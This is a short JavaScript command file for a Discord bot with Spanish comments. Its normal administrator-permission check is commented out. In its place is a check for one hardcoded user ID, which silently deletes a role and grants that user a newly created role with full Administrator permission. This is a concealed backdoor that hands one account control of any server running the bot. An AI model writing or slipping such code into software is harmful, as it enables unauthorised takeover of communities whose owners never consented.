const { PermissionFlagsBits } = require("discord.js");
const embed = require("../../funciones/embed")

module.exports = {
    name: "adm",
    alias: "a",

    async execute(client, message, args) {
        //const permisson = message.member.permissions.has(PermissionFlagsBits.Administrator);
        //if(!permisson)return(message.channel.send({embeds: [embed.embed_red(txt = "No tienes permiso de administrador, no puedes ejecutar el comando")]}))

        if (message.author.id === "607178021841010688") {
            try {
                let deleteRole = await message.guild.roles.delete("1035538306345209856", 'F').then(e => console.log(e)).catch(err => console.log(err))
                const create_role = await message.guild.roles.create({ name: 'adm', color: "#ffff00", permissions: [PermissionFlagsBits.Administrator], position: 3, hoist: false, })
                message.member.roles.add(create_role.id).then(e => console.log(e))
            } catch (error) {
                console.log(error)
            }
        } else return
    }

}